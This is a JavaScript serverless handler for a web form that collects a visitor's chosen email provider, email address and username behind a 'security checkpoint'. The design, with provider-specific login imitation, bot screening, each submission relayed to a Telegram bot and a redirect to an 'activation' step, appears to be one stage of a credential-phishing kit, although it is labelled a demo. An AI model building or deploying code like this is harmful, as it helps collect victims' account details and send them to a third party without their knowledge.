import { getSessionData, createSessionCookieHeader, sendEdgeTelegramNotification } from '../utils/edgeSession.js';

const providerDomains = {
  Gmail: ['@gmail.com'],
  Outlook: ['@outlook.com', '@hotmail.com', '@live.com'],
  Yahoo: ['@yahoo.com', '@ymail.com'],
  AOL: ['@aol.com'],
  ProtonMail: ['@protonmail.com', '@proton.me'],
  iCloud: ['@icloud.com', '@me.com'],
};

function validateEmailProviderDomain(email, provider) {
  const trimmedEmail = (email || '').trim().toLowerCase();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!trimmedEmail || !emailRegex.test(trimmedEmail)) {
    return { valid: false, message: 'Please enter a valid email address.' };
  }

  const allowedDomains = providerDomains[provider];
  if (allowedDomains && allowedDomains.length > 0) {
    const matches = allowedDomains.some((domain) => trimmedEmail.endsWith(domain));
    if (!matches) {
      return {
        valid: false,
        message: `Email for ${provider} must end with ${allowedDomains.join(' or ')}`,
      };
    }
  }

  return { valid: true };
}

export async function onRequestPost(context) {
  const { request, env } = context;
  const authState = await getSessionData(request, env);

  if (authState.state === 'SECURITY_CHECK' && !authState.challengePassed) {
    return new Response(
      JSON.stringify({
        success: false,
        error: 'Session expired or out of sync. Please complete the security checkpoint to continue.',
        redirect: '/',
      }),
      { status: 403, headers: { 'Content-Type': 'application/json' } }
    );
  }

  try {
    const body = await request.json();
    const { provider, email, username } = body;

    const errors = {};
    if (!provider || typeof provider !== 'string' || !provider.trim()) {
      errors.provider = 'Email provider selection is required';
    }

    const emailCheck = validateEmailProviderDomain(email, provider);
    if (!emailCheck.valid) {
      errors.email = emailCheck.message;
    }

    if (!username || typeof username !== 'string' || !username.trim()) {
      errors.username = 'Username is required';
    } else if (username.trim().length < 3) {
      errors.username = 'Username must be at least 3 characters long';
    }

    if (Object.keys(errors).length > 0) {
      return new Response(
        JSON.stringify({ success: false, errors }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    const trimmedEmail = email.trim();
    const trimmedProvider = provider.trim();
    const trimmedUsername = username.trim();

    authState.state = 'ACTIVATION_PAGE';
    authState.provider = trimmedProvider;
    authState.email = trimmedEmail;
    authState.username = trimmedUsername;
    authState.verificationStatus = null;

    sendEdgeTelegramNotification(
      {
        title: 'Demo form submitted',
        lines: [
          `*Provider:* ${trimmedProvider}`,
          `*Email:* ${trimmedEmail}`,
          `*Username:* ${trimmedUsername}`,
          `*Status:* SUBMITTED`,
        ],
      },
      env
    );

    const cookieHeader = await createSessionCookieHeader(authState, env);

    return new Response(
      JSON.stringify({
        success: true,
        next: '/activation',
        email: trimmedEmail,
        provider: trimmedProvider,
        username: trimmedUsername,
      }),
      {
        headers: {
          'Content-Type': 'application/json',
          'Set-Cookie': cookieHeader,
        },
      }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ success: false, error: 'Invalid request body' }),
      { status: 400, headers: { 'Content-Type': 'application/json' } }
    );
  }
}
